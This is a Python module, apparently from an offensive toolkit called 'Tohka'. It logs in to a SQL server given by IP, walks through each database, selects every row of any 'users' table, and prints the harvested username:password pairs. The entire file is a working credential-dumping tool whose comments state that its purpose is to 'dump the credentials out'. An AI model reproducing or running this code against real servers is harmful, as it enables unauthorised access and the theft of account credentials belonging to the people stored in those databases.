from Tohka.lib.constants import SQL_FILTER #type: ignore
from Tohka.lib.colors    import Colors     #type: ignore
from Tohka.lib.login     import login_sql  #type: ignore


class TohkaModule:
    def main(params: str) -> None:
        """Dump all user tables in each database found
        
        Args:
            params(str): SQL server IP address
        
        Returns:
            None
        """
        
        database_lists: list = []
        
        if (conn := login_sql(params)):
            cursor = conn.cursor()
            cursor.execute('show databases')
            # NOTE: Check each database for the users table.
            for db in [db[0] for db in cursor.fetchall() if not [filt for filt in SQL_FILTER if filt in db[0]]]:
                cursor.execute(f'use {db};')

                try:
                    # NOTE: Select users table so we can 
                    # NOTE: dump the credentials out.
                    cursor.execute('SELECT * from users')
                except:
                    # NOTE: users table was not found (failed to inject to and select the table).
                    database_lists.append({db : ['Users table not found.']})
                    continue

                database_creds: list = [] # Database credentials get saved here.
                # NOTE: Dump all the credentials in the database. (users table was found)
                for row in cursor.fetchall():
                    if row[1] and row[2] and not f'{row[1]}:{row[2]}' in database_creds:
                        database_creds.append(f'{row[1]}:{row[2]}')
                                                            
                database_lists.append({db : database_creds})
                
            if database_lists:
                print(f'\n{Colors.AQUA}• {Colors.WHITE}Dumping database\'s...')
                for database in database_lists:
                    for db, creds in database.items():
                        print(f'  {Colors.VIOLET}• {Colors.WHITE}{db}{Colors.WHITE}: {Colors.VIOLET}{f"{Colors.WHITE},{Colors.VIOLET} ".join(creds)}')
            else:
                print(f'\n{Colors.RED}• {Colors.WHITE} No database\'s found.')
                
        print()
        
